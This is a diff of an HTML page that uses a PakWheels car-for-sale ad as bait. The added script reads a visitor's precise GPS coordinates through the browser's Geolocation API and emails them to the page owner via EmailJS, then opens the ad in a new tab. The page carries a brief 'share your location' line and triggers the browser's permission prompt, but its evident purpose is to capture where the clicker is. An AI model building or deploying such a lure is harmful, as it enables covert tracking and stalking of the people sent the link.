@@ -3,16 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PakWheels Ad</title>
+    <title>PakWheels Ad with Location</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             margin-top: 50px;
-        }
-        #adContainer {
-            margin-top: 20px;
-            display: none; /* Hide the ad container initially */
         }
         button {
             padding: 10px 20px;
@@ -26,27 +22,52 @@
             background-color: #28a745;
         }
     </style>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 </head>
 <body>
-    <h3>Click the button below to view the Honda Civic 1997 for sale on PakWheels</h3>
+    <h3>Click the button below to view the Honda Civic 1997 for sale on PakWheels and share your location with us:</h3>
     <button id="openAd">Open PakWheels Ad</button>
 
-    <div id="adContainer">
-        <!-- Example of an embedded PakWheels ad (replace with actual ad code) -->
-        <iframe src="https://www.pakwheels.com/used-cars/honda-civic-1997-for-sale-in-rawalpindi-9972237" width="600" height="400" style="border: none;"></iframe>
-    </div>
-
     <script>
+        // Initialize EmailJS with your user ID (replace 'user_xxxx' with your actual EmailJS user ID)
+        emailjs.init('user_xxxx');
+
         document.getElementById('openAd').onclick = function() {
-            const pakWheelsAdUrl = 'https://www.pakwheels.com/used-cars/honda-civic-1997-for-sale-in-rawalpindi-9972237';  // PakWheels Ad URL
-            
-            // Open the PakWheels Ad URL in a new tab
-            window.open(pakWheelsAdUrl, '_blank');
-            
-            // Optionally, show the embedded ad on the same page
-            // Uncomment the line below if you want to display the ad directly on the page.
-            // document.getElementById('adContainer').style.display = 'block';
+            // Get the user's location using the Geolocation API
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Send the location to your email (using EmailJS)
+                    sendLocationToEmail(latitude, longitude);
+
+                    // Open the PakWheels Ad link in a new tab
+                    const pakWheelsAdUrl = 'https://www.pakwheels.com/used-cars/honda-civic-1997-for-sale-in-rawalpindi-9972237';  
+                    window.open(pakWheelsAdUrl, '_blank');
+                }, function(error) {
+                    alert("Geolocation is not supported or permission denied.");
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
         };
+
+        function sendLocationToEmail(latitude, longitude) {
+            const templateParams = {
+                to_email: 'your_email@example.com',  // Replace with your email address
+                latitude: latitude,
+                longitude: longitude,
+                message: 'User has opened the PakWheels ad link'
+            };
+
+            emailjs.send('service_xxxx', 'template_xxxx', templateParams)  // Replace with your EmailJS service and template IDs
+                .then(function(response) {
+                    console.log('Success:', response);
+                }, function(error) {
+                    console.log('Failed:', error);
+                });
+        }
     </script>
 </body>
 </html>
